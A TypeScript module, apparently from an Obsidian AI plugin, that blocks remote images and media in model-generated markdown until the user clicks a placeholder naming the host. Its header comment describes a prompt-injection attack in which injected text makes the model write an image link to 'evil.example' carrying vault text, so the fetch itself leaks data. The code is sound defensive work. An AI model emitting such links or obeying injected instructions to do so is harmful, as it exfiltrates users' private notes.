import { t } from "../i18n";

/**
 * Remote media in model output loads only when the user asks (security).
 *
 * An answer is rendered through `MarkdownRenderer`, and Obsidian fetches every
 * image, iframe and media source it renders at once. A prompt-injected answer
 * (a web page, a note) can then write `![](https://evil.example/?d=<vault text>)`
 * and the fetch itself is the exfiltration — no click needed. So nothing remote
 * is fetched until the user presses the placeholder that names the host.
 *
 * Two layers, because the second alone is too late:
 *
 * 1. `deferRemoteMedia(md)` rewrites the MARKDOWN before it is rendered. A
 *    browser starts an image fetch as soon as an `<img>` gets its `src` — while
 *    Obsidian builds the fragment, before any DOM pass or MutationObserver can
 *    see it. A remote image becomes an inert `<span class="p-remote-media">`
 *    carrying the address in a `data-` attribute; a raw HTML media tag has its
 *    `src`/`srcset`/`poster`/`data` renamed to `data-p-blocked-*`. Code (fenced
 *    and inline) is never touched — a URL in code is text.
 * 2. `blockRemoteMedia(el)` runs on the rendered DOM: it turns those spans and
 *    renamed attributes into placeholders, strips any remote source layer 1
 *    missed, and keeps a MutationObserver on `el` for what the renderer inserts
 *    later (embeds and post-processors resolve asynchronously). That layer can
 *    only stop a fetch that has not started; layer 1 is the one that prevents it.
 *
 * Every render of model-produced markdown goes through `renderAnswerMarkdown`
 * or `renderRichMarkdown` (ui/renderMarkdown.ts), which apply both.
 */

const MEDIA_SELECTOR = "img, iframe, audio, video, source, embed, object, track";
/** The attributes that make an element fetch. */
const FETCHING_ATTRS = ["src", "srcset", "poster", "data"] as const;
const BLOCKED_PREFIX = "data-p-blocked-";
const MEDIA_TAGS = "img|iframe|audio|video|source|embed|object|track";

/** True for an address a browser would fetch from the network. */
export function isRemoteUrl(url: string): boolean {
	return /^\s*(?:https?:)?\/\//i.test(url);
}

/** True when any candidate of a `srcset` is remote. */
function srcsetIsRemote(srcset: string): boolean {
	return srcset.split(",").some((c) => isRemoteUrl(c.trim().split(/\s+/)[0] ?? ""));
}

function attrIsRemote(name: string, value: string): boolean {
	return name === "srcset" ? srcsetIsRemote(value) : isRemoteUrl(value);
}

function escapeAttr(s: string): string {
	return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function placeholderSpan(kind: string, url: string, alt: string): string {
	return `<span class="p-remote-media" data-p-kind="${kind}" data-p-url="${escapeAttr(url)}" data-p-alt="${escapeAttr(alt)}"></span>`;
}

/** `![alt](url "title")` / `![alt](<url>)` with a remote url. */
const INLINE_IMAGE = /!\[((?:[^\]\\]|\\.)*)\]\(\s*<?((?:https?:)?\/\/[^\s)>]+)>?(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/gi;
/** `![alt][ref]`, `![alt][]` and `![alt]` (shortcut) — resolved against the definitions. */
const REF_IMAGE = /!\[((?:[^\]\\]|\\.)*)\](?:\[([^\]]*)\])?(?![([])/g;
/** A raw HTML media tag. */
const HTML_MEDIA_TAG = new RegExp(`<(?:${MEDIA_TAGS})\\b[^>]*>`, "gi");
const HTML_FETCH_ATTR = /(\s)(src|srcset|poster|data)(\s*=\s*)("[^"]*"|'[^']*'|[^\s"'>]+)/gi;

function rewriteText(text: string, refs: Map<string, string>): string {
	let out = text.replace(INLINE_IMAGE, (_m, alt: string, url: string) => placeholderSpan("img", url, alt));
	if (refs.size > 0) {
		out = out.replace(REF_IMAGE, (m, alt: string, label: string | undefined) => {
			const url = refs.get((label || alt).trim().toLowerCase());
			return url && isRemoteUrl(url) ? placeholderSpan("img", url, alt) : m;
		});
	}
	return out.replace(HTML_MEDIA_TAG, (tag) =>
		tag.replace(HTML_FETCH_ATTR, (m, sp: string, name: string, eq: string, raw: string) => {
			const value = raw.replace(/^["']|["']$/g, "");
			return attrIsRemote(name.toLowerCase(), value) ? `${sp}${BLOCKED_PREFIX}${name.toLowerCase()}${eq}${raw}` : m;
		}));
}

/** Split a line into code spans (kept) and text (rewritten). */
function rewriteOutsideInlineCode(line: string, refs: Map<string, string>): string {
	let out = "";
	let i = 0;
	const tick = /`+/g;
	let m: RegExpExecArray | null;
	while ((m = tick.exec(line)) !== null) {
		const close = line.indexOf(m[0], m.index + m[0].length);
		if (close === -1) break;
		out += rewriteText(line.slice(i, m.index), refs) + line.slice(m.index, close + m[0].length);
		i = close + m[0].length;
		tick.lastIndex = i;
	}
	return out + rewriteText(line.slice(i), refs);
}

/**
 * Layer 1: the markdown with every remote image and media source made inert.
 * Pure; code blocks and inline code are left exactly as written.
 */
export function deferRemoteMedia(md: string): string {
	if (!/(?:https?:)?\/\//i.test(md)) return md; // the common case: nothing to do
	const lines = md.split("\n");
	const refs = new Map<string, string>();
	for (const line of lines) {
		const def = /^\s{0,3}\[([^\]]+)\]:\s*<?(\S+?)>?(?:\s|$)/.exec(line);
		if (def) refs.set(def[1].trim().toLowerCase(), def[2]);
	}
	let fence: string | null = null;
	return lines.map((line) => {
		const f = /^\s{0,3}(`{3,}|~{3,})/.exec(line);
		if (fence) {
			if (f && f[1][0] === fence[0] && f[1].length >= fence.length) fence = null;
			return line;
		}
		if (f) { fence = f[1]; return line; }
		return rewriteOutsideInlineCode(line, refs);
	}).join("\n");
}

function hostOf(url: string): string {
	try {
		return new URL(url.trim().startsWith("//") ? `https:${url.trim()}` : url.trim()).host || url;
	} catch {
		return url; // not a parsable URL: name it as written rather than nothing
	}
}

/** The one placeholder: a link-role button naming the host; pressing it loads. */
function insertPlaceholder(before: Element, url: string, load: () => void): void {
	const host = hostOf(url);
	const btn = before.ownerDocument.createElement("button");
	btn.className = "pb pb-link p-remote-media-load";
	btn.type = "button";
	btn.textContent = t("remoteMediaLoad", { host });
	btn.title = t("remoteMediaTooltip", { url });
	// A property, not a listener: the button lives and dies with the rendered
	// answer, and nothing else holds it.
	btn.onclick = (e) => {
		e.preventDefault();
		e.stopPropagation();
		btn.remove();
		load();
	};
	before.before(btn);
}

/** Restore what a placeholder held back, and let a media element fetch again. */
function restore(unit: HTMLElement): void {
	const els = [unit, ...Array.from(unit.querySelectorAll<HTMLElement>("*"))];
	for (const el of els) {
		for (const name of FETCHING_ATTRS) {
			const held = el.getAttribute(BLOCKED_PREFIX + name);
			if (held === null) continue;
			el.removeAttribute(BLOCKED_PREFIX + name);
			el.setAttribute(name, held);
		}
	}
	released.add(unit);
	unit.hidden = false;
	(unit as HTMLMediaElement).load?.();
}

/** Hold back every remote fetching attribute of `el`; true when one was held. */
function holdBack(el: Element): boolean {
	let held = false;
	for (const name of FETCHING_ATTRS) {
		const value = el.getAttribute(name);
		if (value !== null && attrIsRemote(name, value)) {
			el.setAttribute(BLOCKED_PREFIX + name, value);
			el.removeAttribute(name);
			held = true;
		}
	}
	for (const name of FETCHING_ATTRS) if (el.hasAttribute(BLOCKED_PREFIX + name)) held = true;
	return held;
}

function firstHeldUrl(unit: Element): string {
	for (const el of [unit, ...Array.from(unit.querySelectorAll("*"))]) {
		for (const name of FETCHING_ATTRS) {
			const v = el.getAttribute(BLOCKED_PREFIX + name);
			if (v) return name === "srcset" ? v.split(",")[0].trim().split(/\s+/)[0] : v;
		}
	}
	return "";
}

const guarded = new WeakSet<HTMLElement>();
/** What the user chose to load — never held back again. */
const released = new WeakSet<Element>();
const observed = new WeakSet<HTMLElement>();

function scan(root: HTMLElement): void {
	// Layer 1's spans: an image the markdown asked for, now a placeholder.
	for (const span of Array.from(root.querySelectorAll<HTMLElement>("span.p-remote-media"))) {
		const url = span.getAttribute("data-p-url") ?? "";
		const alt = span.getAttribute("data-p-alt") ?? "";
		insertPlaceholder(span, url, () => {
			const img = span.ownerDocument.createElement("img");
			img.alt = alt;
			released.add(img);
			img.src = url;
			span.replaceWith(img);
		});
		span.classList.replace("p-remote-media", "p-remote-media-held");
	}
	// Anything fetching that got this far: hold it back, one placeholder per unit
	// (a <video> with its <source> children is one thing to load).
	const media = [root, ...Array.from(root.querySelectorAll<HTMLElement>(MEDIA_SELECTOR))]
		.filter((el) => el.matches(MEDIA_SELECTOR));
	for (const el of media) {
		const unit = el.closest<HTMLElement>("picture, video, audio") ?? el;
		if (released.has(el) || released.has(unit) || !holdBack(el)) continue;
		if (guarded.has(unit)) continue;
		guarded.add(unit);
		unit.hidden = true;
		insertPlaceholder(unit, firstHeldUrl(unit), () => restore(unit));
	}
}

/**
 * Layer 2: neutralise remote media in rendered model output. Idempotent; keeps
 * watching `el` for nodes the renderer adds after its promise resolved. The
 * observer is held by `el` alone and goes with it.
 */
export function blockRemoteMedia(el: HTMLElement): void {
	scan(el);
	if (observed.has(el) || typeof MutationObserver !== "function") return;
	observed.add(el);
	new MutationObserver((records) => {
		for (const r of records) {
			if (r.type === "attributes" && r.target instanceof HTMLElement) {
				if (r.target.matches(MEDIA_SELECTOR) && !r.target.hidden) scan(r.target.parentElement ?? r.target);
				continue;
			}
			for (const n of Array.from(r.addedNodes)) if (n instanceof HTMLElement) scan(n.parentElement ?? n);
		}
	}).observe(el, { childList: true, subtree: true, attributes: true, attributeFilter: [...FETCHING_ATTRS] });
}
